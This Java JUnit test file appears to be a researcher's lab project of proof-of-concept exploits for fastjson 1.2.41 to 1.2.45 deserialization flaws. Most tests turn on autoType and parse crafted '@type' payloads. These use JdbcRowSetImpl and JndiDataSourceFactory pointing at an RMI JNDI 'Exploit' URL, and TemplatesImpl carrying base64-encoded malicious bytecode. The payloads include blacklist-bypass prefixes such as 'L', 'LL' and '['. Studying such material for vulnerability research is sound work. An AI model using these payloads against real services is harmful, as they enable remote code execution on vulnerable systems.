package me.mole;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.sun.rowset.JdbcRowSetImpl;
import me.mole.pojo.Student;
import org.apache.commons.io.IOUtils;
import org.apache.tomcat.util.codec.binary.Base64;
import org.junit.jupiter.api.Test;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;

public class Fastjson1241to45ApplicationTest {

    @Test
    public void test1() {
        Student stu1 = new Student();
        stu1.setName("t-mac");
        stu1.setAge(43);
        Student stu2 = new Student();
        stu1.setName("ai");
        stu1.setAge(46);

        Student[] stuArr = new Student[]{stu1, stu2};
        String jsonStr = JSON.toJSONString(stuArr, SerializerFeature.WriteClassName);
        System.out.println(jsonStr);
    }

    /**
     *  fastjson <= 1.2.41
     */
    @Test
    public void test_1241_poc_1() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String fj_poc = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:8085/Exploit\",\"autoCommit\":true}";
        System.out.println(fj_poc);
        JSON.parse(fj_poc);
    }

    private String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return Base64.encodeBase64String(bos.toByteArray());
    }

    /**
     *  fastjson <= 1.2.41
     */
    @Test
    public void test_1241_poc_2() {
        String evilClassPath = "/Users/fa1c0n/codeprojects/IdeaProjects/misc-classes/src/main/java/Exploit2.class";
        String evilCode = readClass(evilClassPath);
        String NASTY_CLASS = "Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;";
        String fj_poc = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{},\"_outputProperties\":{}}\n";
        System.out.println(fj_poc);

        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parse(fj_poc, Feature.SupportNonPublicField);
    }

    /**
     *  fastjson <= 1.2.42
     */
    @Test
    public void test_1242_poc_1() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String fj_poc = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://127.0.0.1:8085/Exploit\",\"autoCommit\":true}";
        System.out.println(fj_poc);
        JSON.parse(fj_poc);
    }

    /**
     * fastjson <= 1.2.42
     */
    @Test
    public void test_1242_poc_2() {
        String evilClassPath = "/Users/fa1c0n/codeprojects/IdeaProjects/misc-classes/src/main/java/Exploit2.class";
        String evilCode = readClass(evilClassPath);
        String NASTY_CLASS = "LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;";
        String fj_poc = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{},\"_outputProperties\":{}}\n";
        System.out.println(fj_poc);

        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parse(fj_poc, Feature.SupportNonPublicField);
    }

    /**
     *  fastjson <= 1.2.43
     */
    @Test
    public void test_1243_poc_1() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String fj_poc = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"rmi://127.0.0.1:8085/Exploit\",\"autoCommit\":true}";
        System.out.println(fj_poc);
        JSON.parse(fj_poc);
    }

    /**
     *  fastjson <= 1.2.43
     */
    @Test
    public void test_1243_poc_2() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String fj_poc = "{\"@type\":\"L[com.sun.rowset.JdbcRowSetImpl;\"[{,\"dataSourceName\":\"rmi://127.0.0.1:8085/Exploit\",\"autoCommit\":true}";
        System.out.println(fj_poc);
        JSON.parse(fj_poc);
    }

    /**
     *  fastjson <= 1.2.45
     */
    @Test
    public void test_1245_poc_1() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String fj_poc = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://127.0.0.1:8085/Exploit\"}}";
        System.out.println(fj_poc);
        JSON.parse(fj_poc);
    }
}
